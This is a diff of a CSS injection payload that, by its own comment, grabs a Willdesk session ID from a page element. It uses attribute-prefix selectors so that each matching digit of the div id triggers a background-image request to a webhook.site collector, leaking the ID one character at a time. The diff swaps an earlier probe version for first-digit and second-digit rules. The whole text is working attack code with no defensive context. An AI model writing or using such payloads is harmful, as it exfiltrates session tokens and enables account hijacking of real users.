@@ -1,34 +1,22 @@
-body {
-  background:url('//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?body=1');
-}
+/* Grab willdesk session ID from div */
+div[id^="willdeskEmailApps_1"]{background:url('//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?a=1')}
+div[id^="willdeskEmailApps_2"]{background:url('//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?a=2')}
+div[id^="willdeskEmailApps_3"]{background:url('//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?a=3')}
+div[id^="willdeskEmailApps_4"]{background:url('//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?a=4')}
+div[id^="willdeskEmailApps_5"]{background:url('//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?a=5')}
+div[id^="willdeskEmailApps_6"]{background:url('//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?a=6')}
+div[id^="willdeskEmailApps_7"]{background:url('//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?a=7')}
+div[id^="willdeskEmailApps_8"]{background:url('//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?a=8')}
+div[id^="willdeskEmailApps_9"]{background:url('//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?a=9')}
+div[id^="willdeskEmailApps_0"]{background:url('//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?a=0')}
 
-div[id^="willdeskEmailApps_1"] {
-  background:url('//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?id=1');
-}
-div[id^="willdeskEmailApps_2"] {
-  background:url('//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?id=2');
-}
-div[id^="willdeskEmailApps_3"] {
-  background:url('//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?id=3');
-}
-div[id^="willdeskEmailApps_4"] {
-  background:url('//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?id=4');
-}
-div[id^="willdeskEmailApps_5"] {
-  background:url('//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?id=5');
-}
-div[id^="willdeskEmailApps_6"] {
-  background:url('//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?id=6');
-}
-div[id^="willdeskEmailApps_7"] {
-  background:url('//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?id=7');
-}
-div[id^="willdeskEmailApps_8"] {
-  background:url('//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?id=8');
-}
-div[id^="willdeskEmailApps_9"] {
-  background:url('//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?id=9');
-}
-div[id^="willdeskEmailApps_0"] {
-  background:url('//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?id=0');
-}
+/* Second digit */
+div[id^="willdeskEmailApps_11"]{background:url('//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?b=11')}
+div[id^="willdeskEmailApps_12"]{background:url('//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?b=12')}
+div[id^="willdeskEmailApps_13"]{background:url('//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?b=13')}
+div[id^="willdeskEmailApps_14"]{background:url('//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?b=14')}
+div[id^="willdeskEmailApps_15"]{background:url('//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?b=15')}
+div[id^="willdeskEmailApps_16"]{background:url('//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?b=16')}
+div[id^="willdeskEmailApps_17"]{background:url('//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?b=17')}
+div[id^="willdeskEmailApps_18"]{background:url('//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?b=18')}
+div[id^="willdeskEmailApps_19"]{background:url('//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?b=19')}
